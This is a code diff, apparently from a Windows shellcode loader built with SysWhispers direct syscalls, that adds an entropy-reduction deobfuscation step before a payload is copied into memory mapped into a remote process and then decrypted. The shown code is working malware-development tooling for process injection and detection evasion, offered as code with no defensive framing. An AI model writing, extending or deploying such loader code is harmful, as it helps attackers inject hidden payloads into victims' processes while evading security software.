@@ -1,6 +1,7 @@
 #include "Common.h"
 #include "Resource.h"
 #include "SysWhispers.h"
+#include "EntropyReducer.h"
 
 BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSize)
 {
@@ -170,6 +171,24 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		}
 		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedRemoteAddress, (INT)sViewSize);
 	}
+
+	// Deobfuscating the payload
+	PRINTA("[#] Press <Enter> To Deobfuscate The Payload ... ");
+	GETCHAR();
+	SIZE_T	DeobfuscatedPayloadSize = NULL;
+	PBYTE	DeobfuscatedPayloadBuffer = NULL;
+
+	PRINTA("[i] Deobfuscating\" ... ");
+	if (!Deobfuscate(pAllocatedAddress, sPayloadSize, &DeobfuscatedPayloadBuffer, &DeobfuscatedPayloadSize)) {
+		return -1;
+	}
+	PRINTA("[+] DONE \n");
+	PRINTA("\t>>> Deobfuscated Payload Size : %ld \n\t>>> Deobfuscated Payload Located At : 0x%p \n", DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);
+
+	// Copying the deobfuscated payload to the allocated address
+	PRINTA("[#] Press <Enter> To Copy The Deobfuscated Payload ... ");
+	GETCHAR();
+	CopyMemoryEx(pAllocatedAddress, DeobfuscatedPayloadBuffer, DeobfuscatedPayloadSize);
 
 	// Decrypting the payload
 	PRINTA("[#] Press <Enter> To Decrypt The Payload ... ");
